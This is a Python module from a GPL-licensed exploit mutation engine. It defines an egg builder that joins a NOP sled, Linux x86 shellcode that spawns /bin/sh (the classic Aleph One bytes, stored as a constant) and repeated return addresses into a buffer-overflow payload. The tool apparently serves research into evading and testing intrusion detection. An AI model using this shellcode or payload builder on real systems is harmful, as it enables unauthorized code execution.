#**********************************************************************
#*                      Sploit Mutation Engine                        *
#**********************************************************************
#* Copyright (C) 2004-2007 Davide Balzarotti                          *
#*                                                                    *
#* This program is free software; you can redistribute it and/or      *
#* modify it under the terms of the GNU General Public License        *
#* version 2.                                                         *
#*                                                                    *
#* This program is distributed in the hope that it will be useful,    *
#* but WITHOUT ANY WARRANTY; without even the implied warranty of     *
#* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.               *
#* See the GNU General Public License for more details.               *
#*                                                                    *
#* You should have received a copy of the GNU General Public License  *
#* along with this program; if not, write to the Free Software        *
#* Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.          *
#*********************************************************************/

# Author:       Davide Balzarotti
# File version: $Id: egg.py 109 2006-02-27 20:17:42Z balzarot $

# System import

# Sploit import
import logger

aleph1 = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"+\
       	 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"+\
	   	 "\x80\xe8\xdc\xff\xff\xff/bin/sh"

DEFAULT_EGG_OPERATORS = []

class Egg:
	def __init__(self, scode):
		self.shellcode  = scode
		self.nopsled    = ""
		self.ret        = ""
		
		self.only_alpha = False    # Only alphanumeric characters
		self.icase      = False    # Only case-insensitive characters
		self.danger     = False    # allow dangerous command in the nop sled
		self.exclude    = []       # List of chacarters to be excluded

class EggManager:
	def __init__(self, scode, size):
		self.log        = logger.main.newSource("EGG")
		self.filters    = DEFAULT_EGG_OPERATORS
		self.egg        = Egg(scode)
		self.size       = size 
		self.ret_number = 0
		self.ret_addr   = ""
		
	def set_nop_params(self, only_alpha = None, icase = None, danger = None, exclude = None):
		if only_alpha: self.egg.only_alpha = only_alpha
		if icase:      self.egg.icase      = icase         
		if danger:     self.egg.danger     = danger        
		if exclude:    self.egg.exclude    = exclude       
		
	def append_ret(self, address, n=1):
		self.ret_number = n
		self.ret_addr   = address
		
	def get_egg(self):
		nops_len = self.size-len(self.egg.shellcode)-(4*self.ret_number)
		
		self.egg.nopsled  = "\x90"*nops_len
		self.egg.ret      = self.ret_addr * self.ret_number
		
		self.log.info("Base Egg: %d nops - %d shellcode len - %d return address"%(nops_len, len(self.egg.shellcode), self.ret_number))
		
		self.log.info('Appling EGG Filters...')
		res = self.egg
		for mf in self.filters:
			res = mf.mutate(res)
		
		self.log.debug("Final:\n NOP: %d bytes\n Code %d bytes\n Ret %d bytes"%(len(res.nopsled), len(res.shellcode), len(res.ret)))
		
		return res.nopsled+res.shellcode+res.ret
	
	#def __str__(self):
	#	return ""	 
